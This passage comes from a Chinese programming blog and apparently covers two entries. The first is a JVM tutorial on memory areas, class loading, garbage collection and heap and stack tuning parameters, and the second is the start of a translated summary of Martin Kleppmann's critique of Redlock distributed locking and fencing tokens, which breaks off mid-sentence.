线程共享区域 。也就是说它们都是 线程不安全 的\n④ 栈    栈 这是我们的代码运行空间。我们编写的每一个方法都会放到 栈 里面运行。\n我们会听说过 本地方法栈 或者 本地方法接口 这两个名词，不过我们基本不会涉及这两块的内容，它俩底层是使用C来进行工作的，和Java没有太大的关系。\n⑤ 程序计数器    主要就是完成一个加载工作，类似于一个指针一样的，指向下一行我们需要执行的代码。和栈一样，都是 线程独享 的，就是说每一个线程都会有自己对应的一块区域而不会存在并发和多线程的问题。\n小总结     Java文件经过编译后变成 .class 字节码文件 字节码文件通过类加载器被搬运到 JVM 虚拟机中 虚拟机主要的5大块：方法区，堆都为线程共享区域，有线程安全问题，栈和本地方法栈和计数器都是独享区域，不存在线程安全问题，而 JVM 的调优主要就是围绕堆，栈两大块进行  1.2 简单的代码例子    一个简单的学生类\n一个main方法\n执行main方法的步骤如下:\n 编译好 App.java 后得到 App.class 后，执行 App.class，系统会启动一个 JVM 进程，从 classpath 路径中找到一个名为 App.class 的二进制文件，将 App 的类信息加载到运行时数据区的方法区内，这个过程叫做 App 类的加载 JVM 找到 App 的主程序入口，执行main方法 这个main中的第一条语句为 Student student = new Student(\u0026ldquo;tellUrDream\u0026rdquo;) ，就是让 JVM 创建一个Student对象，但是这个时候方法区中是没有 Student 类的信息的，所以 JVM 马上加载 Student 类，把 Student 类的信息放到方法区中 加载完 Student 类后，JVM 在堆中为一个新的 Student 实例分配内存，然后调用构造函数初始化 Student 实例，这个 Student 实例持有 指向方法区中的 Student 类的类型信息 的引用 执行student.sayName();时，JVM 根据 student 的引用找到 student 对象，然后根据 student 对象持有的引用定位到方法区中 student 类的类型信息的方法表，获得 sayName() 的字节码地址。 执行sayName()  其实也不用管太多，只需要知道对象实例初始化时会去方法区中找类信息，完成后再到栈那里去运行方法。找方法就在方法表中找。\n二、类加载器的介绍    之前也提到了它是负责加载.class文件的，它们在文件开头会有特定的文件标示，将class文件字节码内容加载到内存中，并将这些内容转换成方法区中的运行时数据结构，并且ClassLoader只负责class文件的加载，而是否能够运行则由 Execution Engine 来决定\n2.1 类加载器的流程    从类被加载到虚拟机内存中开始，到释放内存总共有7个步骤：加载，验证，准备，解析，初始化，使用，卸载。其中验证，准备，解析三个部分统称为连接\n2.1.1 加载     将class文件加载到内存 将静态数据结构转化成方法区中运行时的数据结构 在堆中生成一个代表这个类的 java.lang.Class对象作为数据访问的入口  2.1.2 链接     验证：确保加载的类符合 JVM 规范和安全，保证被校验类的方法在运行时不会做出危害虚拟机的事件，其实就是一个安全检查 准备：为static变量在方法区中分配内存空间，设置变量的初始值，例如 static int a = 3 （注意：准备阶段只设置类中的静态变量（方法区中），不包括实例变量（堆内存中），实例变量是对象初始化时赋值的） 解析：虚拟机将常量池内的符号引用替换为直接引用的过程（符号引用比如我现在import java.util.ArrayList这就算符号引用，直接引用就是指针或者对象地址，注意引用对象一定是在内存进行）  2.1.3 初始化    初始化其实就是执行类构造器方法的\u0026lt;clinit\u0026gt;()的过程，而且要保证执行前父类的\u0026lt;clinit\u0026gt;()方法执行完毕。这个方法由编译器收集，顺序执行所有类变量（static修饰的成员变量）显式初始化和静态代码块中语句。此时准备阶段时的那个 static int a 由默认初始化的0变成了显式初始化的3。 由于执行顺序缘故，初始化阶段类变量如果在静态代码块中又进行了更改，会覆盖类变量的显式初始化，最终值会为静态代码块中的赋值。\n 注意：字节码文件中初始化方法有两种，非静态资源初始化的\u0026lt;init\u0026gt;和静态资源初始化的\u0026lt;clinit\u0026gt;，类构造器方法\u0026lt;clinit\u0026gt;()不同于类的构造器，这些方法都是字节码文件中只能给JVM识别的特殊方法。\n 2.1.4 卸载    GC将无用对象从内存中卸载\n2.2 类加载器的加载顺序    加载一个Class类的顺序也是有优先级的，类加载器从最底层开始往上的顺序是这样的\n BootStrap ClassLoader：rt.jar Extension ClassLoader: 加载扩展的jar包 App ClassLoader：指定的classpath下面的jar包 Custom ClassLoader：自定义的类加载器  2.3 双亲委派机制    当一个类收到了加载请求时，它是不会先自己去尝试加载的，而是委派给父类去完成，比如我现在要 new 一个 Person，这个 Person 是我们自定义的类，如果我们要加载它，就会先委派 App ClassLoader ，只有当父类加载器都反馈自己无法完成这个请求（也就是父类加载器都没有找到加载所需的 Class）时，子类加载器才会自行尝试加载。\n这样做的好处是，加载位于 rt.jar 包中的类时不管是哪个加载器加载，最终都会委托到 BootStrap ClassLoader 进行加载，这样保证了使用不同的类加载器得到的都是同一个结果。\n其实这个也是一个隔离的作用，避免了我们的代码影响了 JDK 的代码，比如我现在自己定义一个 java.lang.String ：\npackage java.lang; public class String { public static void main(String[] args) { System.out.println(); } } 尝试运行当前类的 main 函数的时候，我们的代码肯定会报错。这是因为在加载的时候其实是找到了 rt.jar 中的java.lang.String，然而发现这个里面并没有 main 方法。\n三、运行时数据区    3.1 本地方法栈和程序计数器    比如说我们现在点开Thread类的源码，会看到它的start0方法带有一个native关键字修饰，而且不存在方法体，这种用native修饰的方法就是本地方法，这是使用C来实现的，然后一般这些方法都会放到一个叫做本地方法栈的区域。\n程序计数器其实就是一个指针，它指向了我们程序中下一句需要执行的指令，它也是内存区域中唯一一个不会出现OutOfMemoryError的区域，而且占用内存空间小到基本可以忽略不计。这个内存仅代表当前线程所执行的字节码的行号指示器，字节码解析器通过改变这个计数器的值选取下一条需要执行的字节码指令。\n如果执行的是native方法，那这个指针就不工作了。\n3.2 方法区    方法区主要的作用是存放类的元数据信息，常量和静态变量···等。当它存储的信息过大时，会在无法满足内存分配时报错。\n3.3 虚拟机栈和虚拟机堆    一句话便是：栈管运行，堆管存储。则虚拟机栈负责运行代码，而虚拟机堆负责存储数据。\n3.3.1 虚拟机栈的概念    它是Java方法执行的内存模型。里面会对局部变量，动态链表，方法出口，栈的操作（入栈和出栈）进行存储，且线程独享。同时如果我们听到局部变量表，那也是在说虚拟机栈\npublic class Person{ int a = 1; public void doSomething(){ int b = 2; } } 3.3.2 虚拟机栈存在的异常    如果线程请求的栈的深度大于虚拟机栈的最大深度，就会报 StackOverflowError （这种错误经常出现在递归中）。Java虚拟机也可以动态扩展，但随着扩展会不断地申请内存，当无法申请足够内存时就会报错 OutOfMemoryError。\n3.3.3 虚拟机栈的生命周期    对于栈来说，不存在垃圾回收。只要程序运行结束，栈的空间自然就会释放了。栈的生命周期和所处的线程是一致的。\n这里补充一句：8种基本类型的变量+对象的引用变量+实例方法都是在栈里面分配内存。\n3.3.4 虚拟机栈的执行    我们经常说的栈帧数据，说白了在JVM中叫栈帧，放到Java中其实就是方法，它也是存放在栈中的。\n栈中的数据都是以栈帧的格式存在，它是一个关于方法和运行期数据的数据集。比如我们执行一个方法a，就会对应产生一个栈帧A1，然后A1会被压入栈中。同理方法b会有一个B1，方法c会有一个C1，等到这个线程执行完毕后，栈会先弹出C1，后B1,A1。它是一个先进后出，后进先出原则。\n3.3.5 局部变量的复用    局部变量表用于存放方法参数和方法内部所定义的局部变量。它的容量是以Slot为最小单位，一个slot可以存放32位以内的数据类型。\n虚拟机通过索引定位的方式使用局部变量表，范围为[0,局部变量表的slot的数量]。方法中的参数就会按一定顺序排列在这个局部变量表中，至于怎么排的我们可以先不关心。而为了节省栈帧空间，这些slot是可以复用的，当方法执行位置超过了某个变量，那么这个变量的slot可以被其它变量复用。当然如果需要复用，那我们的垃圾回收自然就不会去动这些内存。\n3.3.6 虚拟机堆的概念    JVM内存会划分为堆内存和非堆内存，堆内存中也会划分为年轻代和老年代，而非堆内存则为永久代。年轻代又会分为Eden和Survivor区。Survivor也会分为FromPlace和ToPlace，toPlace的survivor区域是空的。Eden，FromPlace和ToPlace的默认占比为 8:1:1。当然这个东西其实也可以通过一个 -XX:+UsePSAdaptiveSurvivorSizePolicy 参数来根据生成对象的速率动态调整\n堆内存中存放的是对象，垃圾收集就是收集这些对象然后交给GC算法进行回收。非堆内存其实我们已经说过了，就是方法区。在1.8中已经移除永久代，替代品是一个元空间(MetaSpace)，最大区别是metaSpace是不存在于JVM中的，它使用的是本地内存。并有两个参数\nMetaspaceSize：初始化元空间大小，控制发生GC MaxMetaspaceSize：限制元空间大小上限，防止占用过多物理内存。  移除的原因可以大致了解一下：融合HotSpot JVM和JRockit VM而做出的改变，因为JRockit是没有永久代的，不过这也间接性地解决了永久代的OOM问题。\n3.3.7 Eden年轻代的介绍    当我们new一个对象后，会先放到Eden划分出来的一块作为存储空间的内存，但是我们知道对堆内存是线程共享的，所以有可能会出现两个对象共用一个内存的情况。这里JVM的处理是每个线程都会预先申请好一块连续的内存空间并规定了对象存放的位置，而如果空间不足会再申请多块内存空间。这个操作我们会称作TLAB，有兴趣可以了解一下。\n当Eden空间满了之后，会触发一个叫做Minor GC（就是一个发生在年轻代的GC）的操作，存活下来的对象移动到Survivor0区。Survivor0区满后触发 Minor GC，就会将存活对象移动到Survivor1区，此时还会把from和to两个指针交换，这样保证了一段时间内总有一个survivor区为空且to所指向的survivor区为空。经过多次的 Minor GC后仍然存活的对象（这里的存活判断是15次，对应到虚拟机参数为 -XX:MaxTenuringThreshold 。为什么是15，因为HotSpot会在对象投中的标记字段里记录年龄，分配到的空间仅有4位，所以最多只能记录到15）会移动到老年代。老年代是存储长期存活的对象的，占满时就会触发我们最常听说的Full GC，期间会停止所有线程等待GC的完成。所以对于响应要求高的应用应该尽量去减少发生Full GC从而避免响应超时的问题。\n而且当老年区执行了full gc之后仍然无法进行对象保存的操作，就会产生OOM，这时候就是虚拟机中的堆内存不足，原因可能会是堆内存设置的大小过小，这个可以通过参数-Xms、-Xmx来调整。也可能是代码中创建的对象大且多，而且它们一直在被引用从而长时间垃圾收集无法收集它们。\n补充说明：关于-XX:TargetSurvivorRatio参数的问题。其实也不一定是要满足-XX:MaxTenuringThreshold才移动到老年代。可以举个例子：如对象年龄5的占30%，年龄6的占36%，年龄7的占34%，加入某个年龄段（如例子中的年龄6）后，总占用超过Survivor空间*TargetSurvivorRatio的时候，从该年龄段开始及大于的年龄对象就要进入老年代（即例子中的年龄6对象，就是年龄6和年龄7晋升到老年代），这时候无需等到MaxTenuringThreshold中要求的15\n3.3.8 如何判断一个对象需要被干掉    图中程序计数器、虚拟机栈、本地方法栈，3个区域随着线程的生存而生存的。内存分配和回收都是确定的。随着线程的结束内存自然就被回收了，因此不需要考虑垃圾回收的问题。而Java堆和方法区则不一样，各线程共享，内存的分配和回收都是动态的。因此垃圾收集器所关注的都是堆和方法这部分内存。\n在进行回收前就要判断哪些对象还存活，哪些已经死去。下面介绍两个基础的计算方法\n1.引用计数器计算：给对象添加一个引用计数器，每次引用这个对象时计数器加一，引用失效时减一，计数器等于0时就是不会再次使用的。不过这个方法有一种情况就是出现对象的循环引用时GC没法回收。\n2.可达性分析计算：这是一种类似于二叉树的实现，将一系列的GC ROOTS作为起始的存活对象集，从这个节点往下搜索，搜索所走过的路径成为引用链，把能被该集合引用到的对象加入到集合中。搜索当一个对象到GC Roots没有使用任何引用链时，则说明该对象是不可用的。主流的商用程序语言，例如Java，C#等都是靠这招去判定对象是否存活的。\n（了解一下即可）在Java语言汇总能作为GC Roots的对象分为以下几种：\n 虚拟机栈（栈帧中的本地方法表）中引用的对象（局部变量） 方法区中静态变量所引用的对象（静态变量） 方法区中常量引用的对象 本地方法栈（即native修饰的方法）中JNI引用的对象（JNI是Java虚拟机调用对应的C函数的方式，通过JNI函数也可以创建新的Java对象。且JNI对于对象的局部引用或者全局引用都会把它们指向的对象都标记为不可回收） 已启动的且未终止的Java线程  这种方法的优点是能够解决循环引用的问题，可它的实现需要耗费大量资源和时间，也需要GC（它的分析过程引用关系不能发生变化，所以需要停止所有进程）\n3.3.9 如何宣告一个对象的真正死亡    首先必须要提到的是一个名叫 finalize() 的方法\nfinalize()是Object类的一个方法、一个对象的finalize()方法只会被系统自动调用一次，经过finalize()方法逃脱死亡的对象，第二次不会再调用。\n补充一句：并不提倡在程序中调用finalize()来进行自救。建议忘掉Java程序中该方法的存在。因为它执行的时间不确定，甚至是否被执行也不确定（Java程序的不正常退出），而且运行代价高昂，无法保证各个对象的调用顺序（甚至有不同线程中调用）。在Java9中已经被标记为 deprecated ，且java.lang.ref.Cleaner（也就是强、软、弱、幻象引用的那一套）中已经逐步替换掉它，会比finalize来的更加的轻量及可靠。 判断一个对象的死亡至少需要两次标记\n 如果对象进行可达性分析之后没发现与GC Roots相连的引用链，那它将会第一次标记并且进行一次筛选。判断的条件是决定这个对象是否有必要执行finalize()方法。如果对象有必要执行finalize()方法，则被放入F-Queue队列中。 GC对F-Queue队列中的对象进行二次标记。如果对象在finalize()方法中重新与引用链上的任何一个对象建立了关联，那么二次标记时则会将它移出“即将回收”集合。如果此时对象还没成功逃脱，那么只能被回收了。  如果确定对象已经死亡，我们又该如何回收这些垃圾呢\n3.4 垃圾回收算法    不会非常详细的展开，常用的有标记清除，复制，标记整理和分代收集算法\n3.4.1 标记清除算法    标记清除算法就是分为“标记”和“清除”两个阶段。标记出所有需要回收的对象，标记结束后统一回收。这个套路很简单，也存在不足，后续的算法都是根据这个基础来加以改进的。\n其实它就是把已死亡的对象标记为空闲内存，然后记录在一个空闲列表中，当我们需要new一个对象时，内存管理模块会从空闲列表中寻找空闲的内存来分给新的对象。\n不足的方面就是标记和清除的效率比较低下。且这种做法会让内存中的碎片非常多。这个导致了如果我们需要使用到较大的内存块时，无法分配到足够的连续内存。比如下图\n此时可使用的内存块都是零零散散的，导致了刚刚提到的大内存对象问题\n3.4.2 复制算法    为了解决效率问题，复制算法就出现了。它将可用内存按容量划分成两等分，每次只使用其中的一块。和survivor一样也是用from和to两个指针这样的玩法。fromPlace存满了，就把存活的对象copy到另一块toPlace上，然后交换指针的内容。这样就解决了碎片的问题。\n这个算法的代价就是把内存缩水了，这样堆内存的使用效率就会变得十分低下了\n不过它们分配的时候也不是按照1:1这样进行分配的，就类似于Eden和Survivor也不是等价分配是一个道理。\n3.4.3 标记整理算法    复制算法在对象存活率高的时候会有一定的效率问题，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象进行清理，而是让所有存活的对象都向一端移动，然后直接清理掉边界以外的内存\n3.4.4 分代收集算法    这种算法并没有什么新的思想，只是根据对象存活周期的不同将内存划分为几块。一般是把Java堆分为新生代和老年代，这样就可以根据各个年代的特点采用最适当的收集算法。在新生代中，每次垃圾收集时都发现有大批对象死去，只有少量存活，那就选用复制算法，只需要付出少量存活对象的复制成本就可以完成收集。而老年代中因为对象存活率高、没有额外空间对它进行分配担保，就必须使用“标记-清理”或者“标记-整理”算法来进行回收。\n说白了就是八仙过海各显神通，具体问题具体分析了而已。\n3.5 （了解）各种各样的垃圾回收器    HotSpot VM中的垃圾回收器，以及适用场景\n到jdk8为止，默认的垃圾收集器是Parallel Scavenge 和 Parallel Old\n从jdk9开始，G1收集器成为默认的垃圾收集器 目前来看，G1回收器停顿时间最短而且没有明显缺点，非常适合Web应用。在jdk8中测试Web应用，堆内存6G，新生代4.5G的情况下，Parallel Scavenge 回收新生代停顿长达1.5秒。G1回收器回收同样大小的新生代只停顿0.2秒。\n3.6 （了解）JVM的常用参数    JVM的参数非常之多，这里只列举比较重要的几个，通过各种各样的搜索引擎也可以得知这些信息。\n   参数名称 含义 默认值 说明     -Xms 初始堆大小 物理内存的1/64(\u0026lt;1GB) 默认(MinHeapFreeRatio参数可以调整)空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制.   -Xmx 最大堆大小 物理内存的1/4(\u0026lt;1GB) 默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到 -Xms的最小限制   -Xmn 年轻代大小(1.4or lator)  注意：此处的大小是（eden+ 2 survivor space).与jmap -heap中显示的New gen是不同的。整个堆大小=年轻代大小 + 老年代大小 + 持久代（永久代）大小.增大年轻代后,将会减小年老代大小.此值对系统性能影响较大,Sun官方推荐配置为整个堆的3/8   -XX:NewSize 设置年轻代大小(for 1.3/1.4)     -XX:MaxNewSize 年轻代最大值(for 1.3/1.4)     -XX:PermSize 设置持久代(perm gen)初始值 物理内存的1/64    -XX:MaxPermSize 设置持久代最大值 物理内存的1/4    -Xss 每个线程的堆栈大小  JDK5.0以后每个线程堆栈大小为1M,以前每个线程堆栈大小为256K.根据应用的线程所需内存大小进行 调整.在相同物理内存下,减小这个值能生成更多的线程.但是操作系统对一个进程内的线程数还是有限制的,不能无限生成,经验值在3000~5000左右一般小的应用， 如果栈不是很深， 应该是128k够用的 大的应用建议使用256k。这个选项对性能影响比较大，需要严格的测试。（校长）和threadstacksize选项解释很类似,官方文档似乎没有解释,在论坛中有这样一句话:-Xss is translated in a VM flag named ThreadStackSize”一般设置这个值就可以了   -XX:NewRatio 年轻代(包括Eden和两个Survivor区)与年老代的比值(除去持久代)  -XX:NewRatio=4表示年轻代与年老代所占比值为1:4,年轻代占整个堆栈的1/5Xms=Xmx并且设置了Xmn的情况下，该参数不需要进行设置。   -XX:SurvivorRatio Eden区与Survivor区的大小比值  设置为8,则两个Survivor区与一个Eden区的比值为2:8,一个Survivor区占整个年轻代的1/10   -XX:+DisableExplicitGC 关闭System.gc()  这个参数需要严格的测试   -XX:PretenureSizeThreshold 对象超过多大是直接在旧生代分配 0 单位字节 新生代采用Parallel ScavengeGC时无效另一种直接在旧生代分配的情况是大的数组对象,且数组中无外部引用对象.   -XX:ParallelGCThreads 并行收集器的线程数  此值最好配置与处理器数目相等 同样适用于CMS   -XX:MaxGCPauseMillis 每次年轻代垃圾回收的最长时间(最大暂停时间)  如果无法满足此时间,JVM会自动调整年轻代大小,以满足此值.    其实还有一些打印及CMS方面的参数，这里就不以一一列举了\n四、关于JVM调优的一些方面    根据刚刚涉及的jvm的知识点，我们可以尝试对JVM进行调优，主要就是堆内存那块\n所有线程共享数据区大小=新生代大小 + 年老代大小 + 持久代大小。持久代一般固定大小为64m。所以java堆中增大年轻代后，将会减小年老代大小（因为老年代的清理是使用fullgc，所以老年代过小的话反而是会增多fullgc的）。此值对系统性能影响较大，Sun官方推荐配置为java堆的3/8。\n4.1 调整最大堆内存和最小堆内存    -Xmx –Xms：指定java堆最大值（默认值是物理内存的1/4(\u0026lt;1GB)）和初始java堆最小值（默认值是物理内存的1/64(\u0026lt;1GB))\n默认(MinHeapFreeRatio参数可以调整)空余堆内存小于40%时，JVM就会增大堆直到-Xmx的最大限制.，默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到 -Xms的最小限制。简单点来说，你不停地往堆内存里面丢数据，等它剩余大小小于40%了，JVM就会动态申请内存空间不过会小于-Xmx，如果剩余大小大于70%，又会动态缩小不过不会小于–Xms。就这么简单\n开发过程中，通常会将 -Xms 与 -Xmx两个参数配置成相同的值，其目的是为了能够在java垃圾回收机制清理完堆区后不需要重新分隔计算堆区的大小而浪费资源。\n我们执行下面的代码\nSystem.out.println(\u0026#34;Xmx=\u0026#34; + Runtime.getRuntime().maxMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //系统的最大空间 System.out.println(\u0026#34;free mem=\u0026#34; + Runtime.getRuntime().freeMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //系统的空闲空间 System.out.println(\u0026#34;total mem=\u0026#34; + Runtime.getRuntime().totalMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //当前可用的总空间 注意：此处设置的是Java堆大小，也就是新生代大小 + 老年代大小\n设置一个VM options的参数\n-Xmx20m -Xms5m -XX:+PrintGCDetails  再次启动main方法\n这里GC弹出了一个Allocation Failure分配失败，这个事情发生在PSYoungGen，也就是年轻代中\n这时候申请到的内存为18M，空闲内存为4.214195251464844M\n我们此时创建一个字节数组看看，执行下面的代码\nbyte[] b = new byte[1 * 1024 * 1024]; System.out.println(\u0026#34;分配了1M空间给数组\u0026#34;); System.out.println(\u0026#34;Xmx=\u0026#34; + Runtime.getRuntime().maxMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //系统的最大空间 System.out.println(\u0026#34;free mem=\u0026#34; + Runtime.getRuntime().freeMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //系统的空闲空间 System.out.println(\u0026#34;total mem=\u0026#34; + Runtime.getRuntime().totalMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); 此时free memory就又缩水了，不过total memory是没有变化的。Java会尽可能将total mem的值维持在最小堆内存大小\nbyte[] b = new byte[10 * 1024 * 1024]; System.out.println(\u0026quot;分配了10M空间给数组\u0026quot;); System.out.println(\u0026quot;Xmx=\u0026quot; + Runtime.getRuntime().maxMemory() / 1024.0 / 1024 + \u0026quot;M\u0026quot;); //系统的最大空间 System.out.println(\u0026quot;free mem=\u0026quot; + Runtime.getRuntime().freeMemory() / 1024.0 / 1024 + \u0026quot;M\u0026quot;); //系统的空闲空间 System.out.println(\u0026quot;total mem=\u0026quot; + Runtime.getRuntime().totalMemory() / 1024.0 / 1024 + \u0026quot;M\u0026quot;); //当前可用的总空间  这时候我们创建了一个10M的字节数据，这时候最小堆内存是顶不住的。我们会发现现在的total memory已经变成了15M，这就是已经申请了一次内存的结果。\n此时我们再跑一下这个代码\nSystem.gc(); System.out.println(\u0026#34;Xmx=\u0026#34; + Runtime.getRuntime().maxMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //系统的最大空间 System.out.println(\u0026#34;free mem=\u0026#34; + Runtime.getRuntime().freeMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //系统的空闲空间 System.out.println(\u0026#34;total mem=\u0026#34; + Runtime.getRuntime().totalMemory() / 1024.0 / 1024 + \u0026#34;M\u0026#34;); //当前可用的总空间 此时我们手动执行了一次fullgc，此时total memory的内存空间又变回5.5M了，此时又是把申请的内存释放掉的结果。\n4.2 调整新生代和老年代的比值    -XX:NewRatio \u0026mdash; 新生代（eden+2*Survivor）和老年代（不包含永久区）的比值\n例如：-XX:NewRatio=4，表示新生代:老年代=1:4，即新生代占整个堆的1/5。在Xms=Xmx并且设置了Xmn的情况下，该参数不需要进行设置。\n4.3 调整Survivor区和Eden区的比值    -XX:SurvivorRatio（幸存代）\u0026mdash; 设置两个Survivor区和eden的比值\n例如：8，表示两个Survivor:eden=2:8，即一个Survivor占年轻代的1/10\n4.4 设置年轻代和老年代的大小    -XX:NewSize \u0026mdash; 设置年轻代大小\n-XX:MaxNewSize \u0026mdash; 设置年轻代最大值\n可以通过设置不同参数来测试不同的情况，反正最优解当然就是官方的Eden和Survivor的占比为8:1:1，然后在刚刚介绍这些参数的时候都已经附带了一些说明，感兴趣的也可以看看。反正最大堆内存和最小堆内存如果数值不同会导致多次的gc，需要注意。\n4.5 小总结    根据实际事情调整新生代和幸存代的大小，官方推荐新生代占java堆的3/8，幸存代占新生代的1/10\n在OOM时，记得Dump出堆，确保可以排查现场问题，通过下面命令你可以输出一个.dump文件，这个文件可以使用VisualVM或者Java自带的Java VisualVM工具。\n-Xmx20m -Xms5m -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=你要输出的日志路径  一般我们也可以通过编写脚本的方式来让OOM出现时给我们报个信，可以通过发送邮件或者重启程序等来解决。\n4.6 永久区的设置    -XX:PermSize -XX:MaxPermSize  初始空间（默认为物理内存的1/64）和最大空间（默认为物理内存的1/4）。也就是说，jvm启动时，永久区一开始就占用了PermSize大小的空间，如果空间还不够，可以继续扩展，但是不能超过MaxPermSize，否则会OOM。\ntips：如果堆空间没有用完也抛出了OOM，有可能是永久区导致的。堆空间实际占用非常少，但是永久区溢出 一样抛出OOM。\n4.7 JVM的栈参数调优    4.7.1 调整每个线程栈空间的大小    可以通过-Xss：调整每个线程栈空间的大小\nJDK5.0以后每个线程堆栈大小为1M，以前每个线程堆栈大小为256K。在相同物理内存下,减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右\n4.7.2 设置线程栈的大小    -XXThreadStackSize： 设置线程栈的大小(0 means use default stack size)  这些参数都是可以通过自己编写程序去简单测试的，这里碍于篇幅问题就不再提供demo了\n4.8 (可以直接跳过了)JVM其他参数介绍    形形色色的参数很多，就不会说把所有都扯个遍了，因为大家其实也不会说一定要去深究到底。\n4.8.1 设置内存页的大小    -XXThreadStackSize： 设置内存页的大小，不可设置过大，会影响Perm的大小  4.8.2 设置原始类型的快速优化    -XX:+UseFastAccessorMethods： 设置原始类型的快速优化  4.8.3 设置关闭手动GC    -XX:+DisableExplicitGC： 设置关闭System.gc()(这个参数需要严格的测试)  4.8.4 设置垃圾最大年龄    -XX:MaxTenuringThreshold 设置垃圾最大年龄。如果设置为0的话,则年轻代对象不经过Survivor区,直接进入年老代. 对于年老代比较多的应用,可以提高效率。如果将此值设置为一个较大值, 则年轻代对象会在Survivor区进行多次复制,这样可以增加对象再年轻代的存活时间, 增加在年轻代即被回收的概率。该参数只有在串行GC时才有效.  4.8.5 加快编译速度    -XX:+AggressiveOpts  加快编译速度\n4.8.6 改善锁机制性能    -XX:+UseBiasedLocking  4.8.7 禁用垃圾回收    -Xnoclassgc  4.8.8 设置堆空间存活时间    -XX:SoftRefLRUPolicyMSPerMB 设置每兆堆空闲空间中SoftReference的存活时间，默认值是1s。  4.8.9 设置对象直接分配在老年代    -XX:PretenureSizeThreshold 设置对象超过多大时直接在老年代分配，默认值是0。  4.8.10 设置TLAB占eden区的比例    -XX:TLABWasteTargetPercent 设置TLAB占eden区的百分比，默认值是1% 。  4.8.11设置是否优先YGC    -XX:+CollectGen0First 设置FullGC时是否先YGC，默认值是false。  finally    真的扯了很久这东西，参考了多方的资料，有极客时间的《深入拆解虚拟机》和《Java核心技术面试精讲》，也有百度，也有自己在学习的一些线上课程的总结。希望对你有所帮助，谢谢。\n"},{"id":341,"href":"/database/Redis/%E5%A6%82%E4%BD%95%E5%81%9A%E5%8F%AF%E9%9D%A0%E7%9A%84%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81Redlock%E7%9C%9F%E7%9A%84%E5%8F%AF%E8%A1%8C%E4%B9%88/","title":"如何做可靠的分布式锁，Redlock真的可行么","parent":"Redis","content":"本文是对 Martin Kleppmann 的文章 How to do distributed locking 部分内容的翻译和总结，上次写 Redlock 的原因就是看到了 Martin 的这篇文章，写得很好，特此翻译和总结。感兴趣的同学可以翻看原文，相信会收获良多。\n开篇作者认为现在 Redis 逐渐被使用到数据管理领域，这个领域需要更强的数据一致性和耐久性，这使得他感到担心，因为这不是 Redis 最初设计的初衷（事实上这也是很多业界程序员的误区，越来越把 Redis 当成数据库在使用），其中基于 Redis 的分布式锁就是令人担心的其一。\nMartin 指出首先你要明确你为什么使用分布式锁，为了性能还是正确性？为了帮你区分这二者，在这把锁 fail 了的时候你可以询问自己以下问题：\n 要性能的： 拥有这把锁使得你不会重复劳动（例如一个 job 做了两次），如果这把锁 fail 了，两个节点同时做了这个 Job，那么这个 Job 增加了你的成本。 要正确性的： 拥有锁可以防止并发操作污染你的系统或者数据，如果这把锁 fail 了两个节点同时操作了一份数据，结果可能是数据不一致、数据丢失、file 冲突等，会导致严重的后果。  上述二者都是需求锁的正确场景，但是你必须清楚自己是因为什么原因需要分布式锁。\n如果你只是为了性能，那没必要用 Redlock，它成本高且复杂，你只用一个 Redis 实例也够了，最多加个从防止主挂了。当然，你使用单节点的 Redis 那么断电或者一些情况下，你会丢失锁，但是你的目的只是加速性能且断电这种事情不会经常发生，这并不是什么大问题。并且如果你使用了单节点 Redis，那么很显然你这个应用需要的锁粒度是很模糊粗糙的，也不会是什么重要的服务。\n那么是否 Redlock 对于要求正确性的场景就合适呢？Martin 列举了若干场景证明 Redlock 这种算法是不可靠的。\n用锁保护资源    这节里 Martin 先将 Redlock 放在了一边而是仅讨论总体上一个分布式锁是怎么工作的。在分布式环境下，锁比 mutex 这类复杂，因为涉及到不同节点、网络通信并且他们随时可能无征兆的 fail 。 Martin 假设了一个场景，一个 client 要修改一个文件，它先申请得到锁，然后修改文件写回，放锁。另一个 client 再申请锁 \u0026hellip; 代码流程如下：\n// THIS CODE IS BROKEN function writeData(filename, data) { var lock = lockService.acquireLock(filename); if (!lock) { throw \u0026#39;Failed to acquire lock\u0026#39;; } try { var file = storage.readFile(filename); var updated = updateContents(file, data); storage.writeFile(filename, updated); } finally { lock.release(); } } 可惜即使你的锁服务非常完美，上述代码还是可能跪，下面的流程图会告诉你为什么：\n上述图中，得到锁的 client1 在持有锁的期间 pause 了一段时间，例如 GC 停顿。锁有过期时间（一般叫租约，为了防止某个 client 崩溃之后一直占有锁），但是如果 GC 停顿太长超过了锁租约时间，此时锁已经被另一个 client2 所得到，原先的 client1 还没有感知到锁过期，那么奇怪的结果就会发生，曾经 HBase 就发生过这种 Bug。即使你在 client1 写回之前检查一下锁是否过期也无助于解决这个问题，因为 GC 可能在任何时候发生，即使是你非常不便的时候（在最后的检查与写操作期间）。 如果你认为自己的程序不会有长时间的 GC 停顿，还有其他原因会导致你的进程 pause。例如进程可能读取尚未进入内存的数据，所以它得到一个 page fault 并且等待 page 被加载进缓存；还有可能你依赖于网络服务；或者其他进程占用 CPU；或者其他人意外发生 SIGSTOP 等。\n\u0026hellip; \u0026hellip;. 这里 Martin 又增加了一节列举各种进程 pause 的例子，为了证明上面的代码是不安全的，无论你的锁服务多完美。\n使用 Fencing （栅栏）使得锁变安全    修复问题的方法也很简单：你需要在每次写操作时加入一个 fencing token。这个场景下，fencing token 可以是一个递增的数字（lock service 可以做到），每次有 client 申请锁就递增一次：\nclient1 申请锁同时拿到 token33，然后它进入长时间的停顿锁也过期了。client2 得到锁和 token34 写入数据，紧接着 client1 活过来之后尝试写入数据，自身 token33 比 34 小因此写入操作被拒绝。注意这需要存储层来检查 token，但这并不难实现。如果你使用 Zookeeper 作为 lock service 的话那么你可以使用 zxid 作为递增数字。 但是对于 Redlock 你要知道，没什么生成 fencing token 